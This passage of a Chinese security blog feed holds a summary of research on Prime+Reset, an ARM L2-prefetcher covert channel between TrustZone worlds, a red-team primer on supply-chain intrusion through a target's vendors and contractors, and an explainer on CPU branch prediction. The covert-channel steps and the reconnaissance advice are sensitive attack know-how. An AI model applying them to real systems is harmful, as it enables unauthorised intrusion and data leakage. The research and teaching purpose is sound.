stride])</p></blockquote><p>通过上述的微基准测试方法，作者测试跨距离 stride&#x3D;5 时的预取触发阈值，通过测试经过多少次跨步访问（跨步训练）后才会发生跨步预取，实验结果如下图所示；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1745656153633-c42b4379-8c80-41db-bcff-dce6a3c111d7.png" alt="图2：是否可以触发预取器的结果。"></p><h2 id="3-2-跨距更新策略"><a href="#3-2-跨距更新策略" class="headerlink" title="3.2 跨距更新策略"></a>3.2 跨距更新策略</h2><p>作者通过在训练好的预取器后，使用训练好的内存函数访问mem[offset]，然后对访问 mem[offset + stride]进行计时，具体实现如下；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1745655623657-c3d519c9-3d33-4350-ad26-a4590466b79b.png" alt="清单2：用于确定 L2 预取中的阶段更新策略的微型计算标。"></p><p>测试结果表明，只有当偏移量-最后访问地址&#x3D;stride 时，mem[offset + stride]才会被预取。这一观察结果表明，预取器在启动预取之前会持续更新 stride。</p><h2 id="3-3-索引"><a href="#3-3-索引" class="headerlink" title="3.3 索引"></a>3.3 索引</h2><p>为了测试程序计数器在索引中的作用，我们修改了清单 2 中的第 2 行，增加了一条新的内存指令，该指令与经过训练的程序计数器的最后 N 位相匹配。然而，即使 N &#x3D; 0，预取器仍然被触发，这表明 PC 并不决定预取器的索引。此外，我们还观察到不同的 PC 在同一页面上更新跨距，这证实了跨步预取器依赖于页面地址索引。</p><h2 id="3-4-条目"><a href="#3-4-条目" class="headerlink" title="3.4 条目"></a>3.4 条目</h2><p>为了确定预取条目的总数，我们在 N 个不同页面上训练预取器，并评估第一个页面是否仍可触发。如下图所示，很明显，只要引入再 10 个预设条目，第一个条目就会被驱逐。考虑到这一观察结果，可以得出结论：预取器有 10 个条目。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1745656830289-bf392ffc-bd3e-4b0d-a535-2d6306e7995a.png" alt="图3：L2预取器的条目数量的结果。"></p><h2 id="3-5-L2-跨步预取器与其他核心相互作用"><a href="#3-5-L2-跨步预取器与其他核心相互作用" class="headerlink" title="3.5 L2 跨步预取器与其他核心相互作用"></a>3.5 L2 跨步预取器与其他核心相互作用</h2><p>作者研究了 L2 跨步预取器与不同内核之间的交互。</p><p>在研究中，我们设置了两个进程，分别名为 A 和 B，运行在不同的内核上。这两个进程的执行顺序如图 4 所示。起初，A 在正常世界中运行，为一个预取器条目计时，随后引入延迟。与此同时，B 在安全世界中运行，为 L2 预取器中的 10 个条目计时。A 最终通过检查预取器状态来评估 B 是否驱逐了经过训练的条目。然而，即使我们将 B 中的引物条目增加到 20 个，并在正常世界中运行，也没有观察到驱逐现象。这说明 L2 预取器是在不同内核之间静态划分的，每个内核有 10 个条目。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1745656886455-067cc33d-522d-40d5-bc5e-7dae46103045.png" alt="图4。过程A和B的执行流。请注意，A和B在不同的内核上运行。"></p><p>作者发现了一个可能导致泄漏的关键特征：当同一集群中的任何内核产生 SIGSEGV 信号时，L2 预置器状态会重置，通常是由于访问未分配内存或调用 raise() 函数手动触发等操作。我们排除了其他触发信号。重要的是，由此产生的 SIGSEGV 不会清除缓存数据；它只会影响预取器状态。</p><p>表 III 总结了我们的发现，揭示了只有当同一集群中的另一个内核产生 SIGSEGV 时，该内核在 L2 预取器状态中的条目才会受到后者的影响。我们假设这种重置是 ARMv8 的硬件特性，与操作系统启动的特权指令无关。鉴于缓存数据不受影响，而且这些进程不共享内存，我们假设该功能可能与内存一致性有关，用于维护内存数据的正确性，但与缓存一致性无关。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1745655766449-c7e526ff-880a-4663-b2c0-316a5bdd2463.png" alt="表 III：进程 B 能否通过 L2 预置器干扰进程 A 的测试结果"></p><h1 id="四、跨内核、跨界隐蔽信道攻击"><a href="#四、跨内核、跨界隐蔽信道攻击" class="headerlink" title="四、跨内核、跨界隐蔽信道攻击"></a>四、跨内核、跨界隐蔽信道攻击</h1><p>基于对 L2 预取器的逆向工程研究成果，本节将介绍一种跨内核和跨世界隐蔽信道攻击的开发，称为 Prime+Reset。Prime+Reset 是在安全世界和正常世界之间传输数据的一种手段。</p><p>Prime+Reset 独立于缓存系统或 PMU 运行，这意味着它可以绕过各种现有的缓解技术；</p><h2 id="4-1-威胁模型"><a href="#4-1-威胁模型" class="headerlink" title="4.1 威胁模型"></a>4.1 威胁模型</h2><p>发送方在安全世界或正常世界中运行，打算将数据传输给同一集群中不同世界的接收方，但接收方使用的是不同的内核。它们不共享内存，也不直接通信。</p><p>为了同步发送方和接收方的活动，作者使用新的内核驱动程序实现高分辨率定时器，且在先前的研究中探索了使用用户空间实现定时器，而且无需操作系统权限，因此解除了对操作系统系统级权限的要求。</p><h2 id="4-2-Prime-Reset-攻击流"><a href="#4-2-Prime-Reset-攻击流" class="headerlink" title="4.2 Prime+Reset 攻击流"></a>4.2 Prime+Reset 攻击流</h2><p>攻击流程如下图所示；接收器为 L2 预取器条目计时，并等待设定的周期数。当发送方想要发送 “1 ”时，它会产生一个 SIGSEGV 信号（清除接收方预取器状态）；否则，它会保持空闲。</p><p>作者添加了一个信号处理程序，防止程序终止，从而允许进程在信号发出后继续运行，以获得更好的吞吐量。</p><p>为了在准确性和吞吐量之间取得平衡，我们发现 500 个周期的延迟是最佳的。延迟结束后，接收方检查预取器状态，以确定发送方发送的是 “1 ”还是 “0”（预取器条目存在则表示发送比特“0”，预取器条目不存在则表示发送比特“1”）。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1745655897158-a85e17f4-320d-4981-9689-d0f69c7228d7.png" alt="图5：Prime+Reset的攻击流"></p><h2 id="4-3-攻击场景和结果"><a href="#4-3-攻击场景和结果" class="headerlink" title="4.3 攻击场景和结果"></a>4.3 攻击场景和结果</h2><p>在跨界隐蔽信道通信中，数据通常从安全世界传输到正常世界。因为敏感数据主要存在于安全世界。我们还探讨了通信从正常世界流向安全世界的情况，例如当安全世界的接收者等待正常世界发送者的命令时。</p><p>图 6、图 7 和图 8 利用传输信息 0x89abcdef 展示了这些场景的结果。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1745656912660-18a13ba9-d0cb-4f62-89bf-3fa011d110ca.png" alt="图6：将数据从安全世界传输到正常世界。"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1745656922817-1f60d452-16ea-4d75-b009-ba01923ebd23.png" alt="图7：将数据从普通世界传输到安全世界。"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1745656934111-ca6d04f4-d34b-493b-9dde-3261c67883c2.png" alt="图8：将数据从正常世界传输到正常世界。"></p><p>表 4 提供了 Prime+Reset 的吞吐量和错误率概览，并与之前的跨世界交换机进行了比较。值得注意的是，由于采用了统一的同步机制，Prime+Reset 在不同场景下保持了一致的吞吐量。与最先进的技术[18]相比，它的吞吐量提高了 70 倍，同时保持了相似的准确性。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1745668658253-1e93022c-f96d-4841-aa77-657d25229d94.png" alt="表4 与最先进的跨世界秘密通道攻击的比较。S和N分别代表安全世界和正常世界。†这项工作。"></p><p>吞吐量大幅提高的主要原因是 Prime+Reset 中使用的 L2 预取器的鲁棒性。以前的工作依赖于从 PMU 收集各种事件，并有可能收集多核系统二级缓存中的噪声，而 Prime+Reset 则不同，它不需要复杂的同步方法。相反，它使用了抗噪声能力更强的二级缓存预取器，从而提高了性能。</p><h1 id="五、缓解策略"><a href="#五、缓解策略" class="headerlink" title="五、缓解策略"></a>五、缓解策略</h1><p>要减轻 Prime+Reset 的影响，一种方法是禁用 L2 预置器，虽然这可能会影响性能，但能有效消除攻击。</p>]]></content>
    
    
    <categories>
      
      <category>科研工作</category>
      
    </categories>
    
    
    <tags>
      
      <tag>stride预取器</tag>
      
      <tag>ARM TrustZone</tag>
      
      <tag>预取器</tag>
      
      <tag>Prefetcher</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>供应链攻击</title>
    <link href="/2025/04/13/%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB/"/>
    <url>/2025/04/13/%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>为什么会写这么一篇文章呢？是因为自己还是个小白，懂得东西确实不多，每次说到攻防的时候，问大师傅怎么打点？大师傅都会提到供应链攻击，自己听的时候确实也不太清楚是什么，但是又不太好意思继续问了，那就自己思考一下，写个介绍吧！</p><p>去网上查相关资料，全是一些高层次、讲得很泛的一些文章，在攻防中的攻击面拓展不大，所以自己在阅读了一些文章然后结合一些自己的思考写下了这篇文章。</p><p>本文中可能会参杂一下个人的错误理解，希望各位师傅批评指正。</p><h2 id="二、基础介绍"><a href="#二、基础介绍" class="headerlink" title="二、基础介绍"></a>二、基础介绍</h2><p>在渗透测试中，<strong>供应链攻击（Supply Chain Attack）</strong> 是指攻击者通过入侵目标组织所依赖的第三方供应商、服务或组件（如软件、硬件、开源库、云服务等），利用其与目标之间的信任关系，间接渗透目标系统的攻击方式。这种攻击的核心是“利用信任链的薄弱环节”，而非直接攻击目标本身。</p><h3 id="常见攻击场景："><a href="#常见攻击场景：" class="headerlink" title="常见攻击场景："></a><strong>常见攻击场景</strong>：</h3><ol><li><strong>软件供应链攻击</strong><ul><li>攻击者篡改软件开发商的正版安装包或更新程序（如CCleaner事件）。</li><li>入侵开源代码仓库（如npm、PyPI），植入恶意依赖包。</li></ul></li><li><strong>硬件供应链攻击</strong><ul><li>在设备生产环节植入后门（如恶意固件）。</li><li>通过受感染的USB设备、网络设备等物理载体传播。</li></ul></li><li><strong>服务提供商攻击</strong><ul><li>利用云服务、IT运维服务商的漏洞横向渗透客户网络。</li><li>通过第三方API或SDK的漏洞间接攻击目标系统。</li></ul></li><li><strong>水坑攻击（Watering Hole）</strong><ul><li>攻击目标组织常用的第三方资源（如供应商门户、行业论坛），诱导用户下载恶意文件。</li></ul></li></ol><blockquote><p>上述的都是AI生成的内容，通过上述的内容，大致也可以知道，供应链攻击就是我们去打目标的软件或硬件供应商，把木马和后门写到上面，然后让目标更新软件将我们的木马或者后门保留到目标系统中。But，这对吗？这明显不对，这样做也太危险了吧！<br>首先是非授权渗透测试 + 恶意植入木马，这都够包吃包住好多年了！<br>那么在攻防战中所说的供应链攻击是指什么呢？</p></blockquote><h1 id="三、信息收集供应链攻击"><a href="#三、信息收集供应链攻击" class="headerlink" title="三、信息收集供应链攻击"></a>三、信息收集供应链攻击</h1><p>在信息收集的过程中，有时候攻击者即使收集到了目标系统的一些指纹信息包括使用的框架、版本等信息，但是由于目标防范比较到位，无法进一步的采取攻击。</p><p>攻击者将目光聚集在目标企业的上下游供应商，比如IT供应商、安全供应商等，从这些上下游企业中找到软件或系统、管理上的漏洞，进而攻进目标企业内部。包括但不限于以下厂商</p><ul><li>网页框架供应商</li><li>软件开发商</li><li>外包业务承包商</li><li>代理商</li><li>使用同一套框架和软件的厂商</li></ul><p>攻击者在上下游企业的测试的目标不是将这些企业的系统全部拿下，而且从这些企业中获取关于攻击者目标系统的相关信息。例如：</p><ul><li>通过攻击使用同一套框架和软件的厂商，获取其权限，下载其使用的框架和软件源代码，进行代码审计，再进行进一步的渗透测试；</li><li>攻击软件开发商，通过攻击软件开发商，攻击者能够获得多版本的软件源码，以及更新日志补丁等等，更容易进行审计测试；</li><li>攻击外包业务承包商，攻击者能够通过外包业务承包商所进行的工作，提交的文件获得关于目标的相关信息，包括一些系统实现的源码；</li><li>代理商或合作企业，攻击者能够获得关于目标企业的人员信息，有助于进一步进入目标系统后台或相关的管理界面；</li></ul><p>在这里的攻击的主要目标就是要获取关于目标系统的信息，最主要的是获取目标系统使用的框架和软件设计的源代码，有了源代码，是否存在漏洞利用，便只是代码审计的时间问题！</p><h1 id="四、恶意钓鱼供应链攻击"><a href="#四、恶意钓鱼供应链攻击" class="headerlink" title="四、恶意钓鱼供应链攻击"></a>四、恶意钓鱼供应链攻击</h1><p>建议阅读参考文章，本人能力有限，确实不能对其作出什么非常高深的讲解。</p><h1 id="五、软件供应链攻击"><a href="#五、软件供应链攻击" class="headerlink" title="五、软件供应链攻击"></a>五、软件供应链攻击</h1><p>建议阅读参考文章，本人能力有限，确实不能对其作出什么非常高深的讲解。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://security.tencent.com/index.php/blog/msg/140#:~:text=%E4%BA%8C%E3%80%81%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%80%9D%E8%B7%AF%201%201.%E8%87%AA%E5%BB%BA%E5%86%85%E9%83%A8%E8%BD%AF%E4%BB%B6%E6%BA%90%20%E4%BC%81%E4%B8%9A%E5%9C%A8%E5%86%85%E9%83%A8%E8%87%AA%E5%BB%BA%E8%BD%AF%E4%BB%B6%E6%BA%90%EF%BC%8C%E8%BD%AF%E4%BB%B6%E6%BA%90%E9%99%90%E5%AE%9A%E5%AE%98%E6%96%B9%E6%9D%A5%E6%BA%90%E3%80%81%E5%8A%A0%E5%AF%86%E5%90%8C%E6%AD%A5%E5%8D%8F%E8%AE%AE%EF%BC%88https%EF%BC%89%E3%80%82%20%E5%86%85%E9%83%A8%E8%BD%AF%E4%BB%B6%E6%BA%90%E5%8F%AF%E4%BB%A5%E6%8E%A7%E5%88%B6%E6%94%B6%E6%95%9B%E6%BA%90%E5%A4%B4%EF%BC%8C%E5%9C%A8%E5%8F%91%E7%94%9F%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E6%97%B6%E5%8F%AF%E4%BB%A5%E4%B8%8D%E4%BE%9D%E8%B5%96%E5%A4%96%E9%83%A8%E5%BF%AB%E9%80%9F%E9%98%BB%E6%96%AD%EF%BC%8C%E9%80%9A%E8%BF%87%E5%AE%A1%E8%AE%A1%E6%97%A5%E5%BF%97%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%BF%AB%E9%80%9F%E6%BA%AF%E6%BA%90%E6%AD%A2%E6%8D%9F%E3%80%82%20%E5%90%8C%E6%97%B6%E5%86%85%E9%83%A8%E8%BD%AF%E4%BB%B6%E6%BA%90%E9%80%9A%E8%BF%87%E5%A4%9A%E6%BA%90%E6%8C%87%E7%BA%B9%E9%AA%8C%E8%AF%81%E3%80%81%E8%93%9D%E5%86%9B%E6%BC%94%E4%B9%A0%E7%AD%89%E5%8A%A0%E5%BC%BA%E5%AE%89%E5%85%A8%E8%83%BD%E5%8A%9B%E3%80%82%20...%202,...%203%203.%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F%20%E4%BB%A5%E4%B8%8A%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88%E5%A4%84%E4%BA%8E%E4%BA%8B%E4%B8%AD%E5%92%8C%E4%BA%8B%E5%90%8E%EF%BC%8C%E5%9D%87%E5%B1%9E%E4%BA%8E%E8%A2%AB%E5%8A%A8%E9%98%B2%E5%AE%88%EF%BC%8C%E5%BD%93%E9%9D%A2%E5%AF%B9%E4%BD%8E%E6%88%90%E6%9C%AC%E7%9A%84%E8%84%9A%E6%9C%AC%E7%B1%BB%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB%EF%BC%8C%E5%BA%94%E6%80%A5%E5%8E%8B%E5%8A%9B%E6%9E%81%E5%A4%A7%EF%BC%8C%E5%9B%A2%E9%98%9F%E5%A2%9E%E5%8A%A0%E4%BA%86%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F%E6%96%B9%E6%A1%88%EF%BC%8C%E6%8F%90%E5%89%8D%E5%8F%91%E7%8E%B0%E9%A3%8E%E9%99%A9%EF%BC%8C%E5%87%8F%E5%B0%91%E6%94%BB%E5%87%BB%E9%9D%A2%E3%80%82%203.1%20%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF%201.%20">源头之战，不断升级的攻防对抗技术 —— 软件供应链攻击防御探索</a></li><li><a href="https://zhuanlan.zhihu.com/p/568950328">攻防比赛中通过供应链进行渗透攻击</a></li><li><a href="https://security.tencent.com/index.php/blog/msg/185">浅析软件供应链攻击之包抢注低成本钓鱼</a></li><li><a href="https://xz.aliyun.com/news/14774">红队攻防 | 个人信息收集打点篇</a></li><li><a href="https://www.anquanke.com/post/id/274399">记一次供应链攻击的应急响应和防御思考</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>攻防渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
      <tag>供应链</tag>
      
      <tag>钓鱼</tag>
      
      <tag>基础介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CPU的分支预测</title>
    <link href="/2025/03/17/CPU%E7%9A%84%E5%88%86%E6%94%AF%E9%A2%84%E6%B5%8B/"/>
    <url>/2025/03/17/CPU%E7%9A%84%E5%88%86%E6%94%AF%E9%A2%84%E6%B5%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="一、基础介绍"><a href="#一、基础介绍" class="headerlink" title="一、基础介绍"></a>一、基础介绍</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p><strong>分支预测（Branch Prediction）</strong>是现代CPU中用于优化指令流水线性能的关键技术，旨在解决<strong>条件分支指令</strong>（如 <code>if-else</code>、循环等）导致的流水线停顿问题。</p><h2 id="1-2-为什么需要分支预测"><a href="#1-2-为什么需要分支预测" class="headerlink" title="1.2 为什么需要分支预测"></a>1.2 为什么需要分支预测</h2><ul><li><strong>流水线技术</strong>：现代CPU通过流水线（Pipeline）并行处理指令，每个时钟周期完成一条指令的不同阶段（取指、解码、执行等）。</li><li><strong>分支带来的问题</strong>：当遇到条件分支（如 <code>if (x &gt; 0)</code>）时，CPU需要等待条件结果（x是否大于0）才能决定下一条指令的位置。这会导致流水线停顿（Pipeline Stall），浪费多个时钟周期。</li><li><strong>预测的必要性</strong>：为了不阻塞流水线，CPU会<strong>预测分支的方向</strong>（跳转或不跳转），并提前执行预测路径的指令。如果预测正确，性能无损；若错误，则需回滚（惩罚周期）。</li></ul><h2 id="1-3-分支预测的分类"><a href="#1-3-分支预测的分类" class="headerlink" title="1.3 分支预测的分类"></a>1.3 分支预测的分类</h2><h3 id="1-3-1-静态分支预测"><a href="#1-3-1-静态分支预测" class="headerlink" title="1.3.1 静态分支预测"></a>1.3.1 静态分支预测</h3><p><strong>原理</strong>：无需历史信息，仅根据指令类型或编译器提示预测。</p><p><strong>常见策略</strong>：</p><ul><li><strong>总预测不跳转</strong>：假设分支条件不满足，继续执行下一条指令。</li><li><strong>反向跳转预测跳转</strong>：常用于循环（如 <code>for</code> 循环末尾的跳转指令）。</li><li><strong>编译器提示</strong>：通过指令（如Intel的<code>likely/unlikely</code>宏）标记分支概率。</li></ul><h3 id="1-3-2-动态分支预测"><a href="#1-3-2-动态分支预测" class="headerlink" title="1.3.2 动态分支预测"></a>1.3.2 动态分支预测</h3><p><strong>原理</strong>：根据分支指令的历史行为动态调整预测策略。</p><p><strong>关键结构</strong>：<strong>分支历史表（Branch History Table, BHT）</strong>，记录每条分支指令的近期执行结果。</p><p>目前的 CPU 基本都采用的是动态分支预测，动态分支预测能够应对更多的执行情况，而且更容易产生正确的预测。</p><h1 id="二、关键数据结构及作用"><a href="#二、关键数据结构及作用" class="headerlink" title="二、关键数据结构及作用"></a>二、关键数据结构及作用</h1><h2 id="2-1-分支目标缓冲-Branch-Target-Buffer-BTB"><a href="#2-1-分支目标缓冲-Branch-Target-Buffer-BTB" class="headerlink" title="2.1 分支目标缓冲(Branch Target Buffer, BTB)"></a>2.1 分支目标缓冲(Branch Target Buffer, BTB)</h2><ul><li><strong>功能</strong>：存储分支指令的 <strong>地址（PC）</strong> 及其 <strong>目标地址（Target PC）</strong>，实现快速跳转。</li><li><strong>结构</strong>：<ul><li><strong>类Cache结构</strong>：通常为组相联（Set-Associative），通过分支指令的PC哈希到特定组。</li><li><strong>条目内容</strong>：分支PC、目标PC、预测状态（如饱和计数器）、有效位等。</li></ul></li><li><strong>工作流程</strong>：<ul><li><strong>取指时查询BTB</strong>：若当前PC命中BTB，则预测跳转并直接获取目标PC。</li><li><strong>执行后更新BTB</strong>：若实际分支方向或目标地址与预测不符，更新BTB条目。</li></ul></li></ul><h2 id="2-2-返回地址栈-Return-Stack-Buffer-RSB"><a href="#2-2-返回地址栈-Return-Stack-Buffer-RSB" class="headerlink" title="2.2 返回地址栈(Return Stack Buffer, RSB)"></a>2.2 返回地址栈(Return Stack Buffer, RSB)</h2><ul><li><strong>功能</strong>：专门预测 <strong>函数返回（</strong><code>ret</code><strong>指令）</strong> 的目标地址，解决嵌套调用导致的预测难题。</li><li><strong>结构</strong>：<ul><li><strong>硬件栈</strong>：通常是先进后出（LIFO）的栈结构，深度有限（如Intel Skylake的RSB深度为16）。</li><li><strong>条目内容</strong>：函数调用（<code>call</code>）时压入的返回地址。</li></ul></li><li><strong>工作流程</strong>：<ul><li><code>call</code>指令：执行时将下一条指令地址（返回地址）压入RSB。</li><li><code>ret</code>指令：预测时从RSB弹出栈顶地址作为目标PC。</li><li><strong>栈溢出&#x2F;欠载处理</strong>：若RSB空，退化为BTB预测；若溢出，丢弃最旧条目。</li></ul></li></ul><h2 id="2-3-分支历史表-Branch-History-Table-BHT"><a href="#2-3-分支历史表-Branch-History-Table-BHT" class="headerlink" title="2.3 分支历史表(Branch History Table, BHT)"></a>2.3 分支历史表(Branch History Table, BHT)</h2><ul><li><strong>功能</strong>：记录分支指令的历史行为（跳转&#x2F;不跳转），用于动态预测方向。</li><li><strong>结构</strong>：<ul><li><strong>2位饱和计数器</strong>：每个分支指令对应一个状态机（如00-强不跳转，11-强跳转）。</li><li><strong>索引方式</strong>：通过分支PC哈希或结合全局历史（GHR）索引。</li></ul></li><li><strong>更新规则</strong>：实际分支结果若跳转，则状态+1（上限11）；否则-1（下限00）。</li></ul><h2 id="2-4-全局历史寄存器-Global-History-Register-GHR"><a href="#2-4-全局历史寄存器-Global-History-Register-GHR" class="headerlink" title="2.4 全局历史寄存器(Global History Register, GHR)"></a>2.4 全局历史寄存器(Global History Register, GHR)</h2><ul><li><strong>功能</strong>：记录近期所有分支指令的结果（跳转&#x3D;1，不跳转&#x3D;0），用于关联预测。</li><li><strong>结构</strong>：<ul><li><strong>移位寄存器</strong>：长度固定（如10位），每次分支后左移并入最新结果。</li><li><strong>与PC哈希</strong>：结合当前分支PC和GHR值索引BHT（如gshare算法）。</li></ul></li></ul><h2 id="2-5-总结"><a href="#2-5-总结" class="headerlink" title="2.5 总结"></a>2.5 总结</h2><table><thead><tr><th align="center"><strong>数据结构</strong></th><th align="center"><strong>预测阶段作用</strong></th><th align="center"><strong>更新阶段操作</strong></th></tr></thead><tbody><tr><td align="center"><strong>BTB</strong></td><td align="center">快速判断分支类型及目标地址</td><td align="center">新增&#x2F;更新分支条目及目标地址</td></tr><tr><td align="center"><strong>BHT&#x2F;PHT</strong></td><td align="center">提供分支方向预测（局部&#x2F;全局历史）</td><td align="center">调整饱和计数器状态</td></tr><tr><td align="center"><strong>GHR</strong></td><td align="center">记录全局分支历史，用于关联预测</td><td align="center">左移并入最新分支结果</td></tr><tr><td align="center"><strong>RSB</strong></td><td align="center">专用于<code>ret</code>指令的目标地址预测</td><td align="center"><code>call</code>压栈，<code>ret</code>弹栈</td></tr></tbody></table><h1 id="三、预测流程"><a href="#三、预测流程" class="headerlink" title="三、预测流程"></a>三、预测流程</h1><h2 id="3-1-预测阶段的操作流程"><a href="#3-1-预测阶段的操作流程" class="headerlink" title="3.1 预测阶段的操作流程"></a>3.1 预测阶段的操作流程</h2><p>当CPU需要预测一个分支指令时，按以下顺序操作四个表：</p><h4 id="步骤1：取指阶段（Fetch-Stage）"><a href="#步骤1：取指阶段（Fetch-Stage）" class="headerlink" title="步骤1：取指阶段（Fetch Stage）"></a><strong>步骤1：取指阶段（Fetch Stage）</strong></h4><ul><li><strong>输入</strong>：当前指令地址（PC）。</li><li><strong>操作</strong>：<ol><li><strong>查询BTB</strong>：<ul><li>用当前PC的哈希值查询BTB，判断是否是已记录的分支指令。</li><li><strong>命中BTB</strong>：获取分支类型（条件分支&#x2F;函数调用&#x2F;返回等）和目标地址。</li><li><strong>未命中</strong>：默认为非分支指令，继续顺序取指。</li></ul></li><li><strong>分支类型判定</strong>：<ul><li><strong>条件分支（</strong><code>jcc</code><strong>）</strong>：进入BHT&#x2F;GHR预测流程。</li><li><strong>函数调用（</strong><code>call</code>）：记录返回地址到RSB。</li><li><strong>函数返回（</strong><code>ret</code><strong>）</strong>：从RSB弹出目标地址。</li></ul></li></ol></li></ul><h4 id="步骤2：分支方向预测（条件分支专用）"><a href="#步骤2：分支方向预测（条件分支专用）" class="headerlink" title="步骤2：分支方向预测（条件分支专用）"></a><strong>步骤2：分支方向预测（条件分支专用）</strong></h4><ul><li><strong>输入</strong>：分支指令的PC、全局历史（GHR）。</li><li><strong>操作</strong>：<ol><li><strong>索引BHT&#x2F;PHT</strong>：<ul><li><strong>局部预测</strong>：仅用分支PC哈希索引BHT，获取2位饱和计数器状态。</li><li><strong>关联预测</strong>（如gshare）：将分支PC与GHR异或生成索引，查询PHT。</li></ul></li><li><strong>生成预测结果</strong>：<ul><li>根据BHT&#x2F;PHT中的状态（如11&#x3D;强跳转）预测方向（跳转&#x2F;不跳转）。</li></ul></li></ol></li></ul><h4 id="步骤3：目标地址预测"><a href="#步骤3：目标地址预测" class="headerlink" title="步骤3：目标地址预测"></a><strong>步骤3：目标地址预测</strong></h4><ul><li><strong>条件分支</strong>：通过BTB获取目标地址（已提前存储）。</li><li><strong>函数返回（</strong><code>ret</code><strong>）</strong>：从RSB栈顶弹出目标地址。</li><li><strong>函数调用（</strong><code>call</code><strong>）</strong>：目标地址直接由指令给出，同时将下一条指令地址（返回地址）压入RSB。</li></ul><h4 id="步骤4：预取指令"><a href="#步骤4：预取指令" class="headerlink" title="步骤4：预取指令"></a><strong>步骤4：预取指令</strong></h4><ul><li>根据预测方向和目标地址，从预测路径（跳转目标或顺序下一条）预取指令到流水线。</li></ul><h2 id="3-2-执行阶段验证与更新"><a href="#3-2-执行阶段验证与更新" class="headerlink" title="3.2 执行阶段验证与更新"></a>3.2 执行阶段验证与更新</h2><p>当分支指令实际执行后，验证预测是否正确，并更新相关数据结构：</p><h4 id="步骤1：验证结果"><a href="#步骤1：验证结果" class="headerlink" title="步骤1：验证结果"></a><strong>步骤1：验证结果</strong></h4><ul><li><strong>实际跳转方向</strong>：比较预测方向与实际结果（跳转&#x2F;不跳转）。</li><li><strong>实际目标地址</strong>：比较预测目标地址与实际地址（如间接跳转地址变化）。</li></ul><h4 id="步骤2：更新数据结构"><a href="#步骤2：更新数据结构" class="headerlink" title="步骤2：更新数据结构"></a><strong>步骤2：更新数据结构</strong></h4><ol><li><strong>BHT&#x2F;PHT更新</strong>：<ul><li>若预测错误，根据实际结果调整饱和计数器（例如实际跳转则+1，否则-1）。</li><li>在关联预测中，更新GHR（将实际结果左移并入全局历史）。</li></ul></li><li><strong>BTB更新</strong>：<ul><li>若分支指令未记录在BTB中，新增条目（PC→目标地址）。</li><li>若目标地址变化（如间接跳转），更新BTB中的目标地址。</li></ul></li><li><strong>RSB维护</strong>：<ul><li><code>call</code>执行时：将返回地址压入RSB。</li><li><code>ret</code>执行时：若RSB未空，弹出栈顶地址；若栈空则通过BTB或顺序地址回退。</li></ul></li><li><strong>GHR更新</strong>：<ul><li>将实际分支结果（1&#x3D;跳转，0&#x3D;不跳转）左移并入GHR寄存器。</li><li>例如：GHR原为 <code>0b1011</code>，实际跳转→更新为 <code>0b10111</code>（保留固定长度）。</li></ul></li></ol><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">分支预测通过 </font><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">BTB（目标地址）、BHT&#x2F;PHT（方向预测）、GHR（全局历史）、RSB（函数返回）</font></strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);"> 四个表的协同操作，在取指阶段快速预测分支行为，最大化流水线吞吐量。预测错误时，通过更新机制动态修正表的记录，逐步提升预测准确率。理解这一流程有助于在代码中规避分支密集或模式随机的逻辑，从而减少预测错误带来的性能损失。</font></p>]]></content>
    
    
    <categories>
      
      <category>科研工作</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CPU</tag>
      
      <tag>分支预测</tag>
      
      <tag>硬件安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免入土（一）基础篇</title>
    <link href="/2025/02/24/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <url>/2025/02/24/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    
